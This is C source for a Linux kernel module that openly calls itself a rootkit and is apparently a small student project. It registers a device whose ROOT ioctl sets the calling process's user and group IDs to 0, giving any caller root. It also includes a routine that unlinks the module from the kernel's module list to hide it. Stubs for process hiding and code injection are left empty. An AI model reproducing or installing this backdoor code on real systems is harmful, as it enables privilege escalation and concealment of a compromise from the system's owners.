#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/workqueue.h>
#include <linux/miscdevice.h>
#include <linux/list.h>
#include <linux/rhashtable.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include "bdoor.h"
#include "bdoor_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ethan, Cyrus, and Nick");
MODULE_DESCRIPTION("rootkit kernel module");
MODULE_VERSION("0.02");


static bool creds_were_saved = false;
static struct cred old_creds;

static void save_old_creds(struct cred *cur_creds)
{
	old_creds.uid.val = cur_creds->uid.val;
	old_creds.gid.val = cur_creds->gid.val;
	old_creds.euid.val = cur_creds->euid.val;
	old_creds.egid.val = cur_creds->egid.val;
	old_creds.suid.val = cur_creds->suid.val;
	old_creds.sgid.val = cur_creds->sgid.val;
	old_creds.fsuid.val = cur_creds->fsuid.val;
	old_creds.fsgid.val = cur_creds->fsgid.val;
	creds_were_saved = true;
}

static long root_ioctl(struct file *file, unsigned long arg)
{
	struct cred *root;
	printk(KERN_INFO "current_pid:%d\n",current->pid);
	printk(KERN_INFO "current_uid:%d\n",({current_uid();}).val);
	root = prepare_creds();

	//dunno which type of error to return if this fails, but this one seems good
	if (root == NULL)
		return -EAGAIN;

	if (root->uid.val == 0) {
		abort_creds(root);
		goto out;
	}
	save_old_creds(root);

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
out:
	return 0;
}

static long unroot_ioctl(struct file *file, unsigned long arg)
{
	struct cred *orig;
	printk(KERN_INFO "current_pid:%d\n",current->pid);
	printk(KERN_INFO "current_uid:%d\n",({current_uid();}).val);
	if (!creds_were_saved) {
		printk(KERN_INFO "ROOTKIT: YOU HAVEN'T ROOTED YOURSELF YET\n");
		goto out;
	}

	orig = prepare_creds();

	//dunno which type of error to return if this fails, but this one seems good
	if (orig == NULL)
		return -EAGAIN;

	orig->uid.val = old_creds.uid.val;
	orig->gid.val = old_creds.gid.val;
	orig->euid.val = old_creds.euid.val;
	orig->egid.val = old_creds.egid.val;
	orig->suid.val = old_creds.suid.val;
	orig->sgid.val = old_creds.sgid.val;
	orig->fsuid.val = old_creds.fsuid.val;
	orig->fsgid.val = old_creds.fsgid.val;

	commit_creds(orig);
	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
out:
	return 0;
}

static long urand_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long hide_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long show_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long list_hidden_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long inject_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long replace_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static bool mod_is_hidden;
static struct list_head *prev_module;

static void hideme(void)
{
	mod_is_hidden = true;
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}


static long hide_mod_ioctl(struct file *file, unsigned long arg)
{
	long ret = 0;
	if (mod_is_hidden)
		goto out;
	hideme();
out:
	return ret;
}

static void showme(void)
{
	mod_is_hidden = false;
	list_add(&THIS_MODULE->list, prev_module);
}

static long show_mod_ioctl(struct file *file, unsigned long arg)
{
	long ret = 0;
	if (!mod_is_hidden)
		goto out;
	showme();
out:
	return ret;
}

static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	int err;
	long ret;

	switch (cmd) {

	case ROOT_IOCTL:
		ret = root_ioctl(file,arg);
		break;

	case UNROOT_IOCTL:
		ret = unroot_ioctl(file,arg);
		break;

	case URAND_IOCTL:
		ret = urand_ioctl(file,arg);
		break;

	case HIDE_IOCTL:
		ret = hide_ioctl(file,arg);
                break;

	case SHOW_IOCTL:
		ret = show_ioctl(file,arg);
                break;

	case LIST_HIDDEN_IOCTL:
		ret = list_hidden_ioctl(file,arg);
		break;

	case INJECT_IOCTL:
		ret = inject_ioctl(file,arg);
                break;

	case REPLACE_IOCTL:
		ret = replace_ioctl(file,arg);
                break;

	case HIDE_MOD_IOCTL:
		ret = hide_mod_ioctl(file,arg);
		break;

	case SHOW_MOD_IOCTL:
		ret = show_mod_ioctl(file,arg);
		break;

	default:
		ret = -ENOTTY;
	}

	return ret;
}

static int rkit_open(struct inode *inode, struct file *file)
{
        return 0;
}
static int rkit_release(struct inode *inode, struct file *file)
{
        return 0;
}

static const struct file_operations rkit_fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = rkit_ioctl,
	.open = rkit_open,
	.release = rkit_release,
};

static struct miscdevice rkit_dev = {
        .minor = BDOOR_DEV_MINOR,
        .name = BDOOR_DEV_NAME,
        .fops = &rkit_fops,
	.mode = S_IRUSR | S_IWUSR | S_IROTH,
};


static int __init rootkit_init(void)
{
	int error;
	printk(KERN_INFO "rootkit init\n");
	error = misc_register(&rkit_dev);
	if(error)
                goto misc_register_cleanup;
	return 0;

misc_register_cleanup:
	return error;
}

static void __exit rootkit_exit(void)
{
	printk(KERN_INFO "rootkit exit\n");
	misc_deregister(&rkit_dev);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
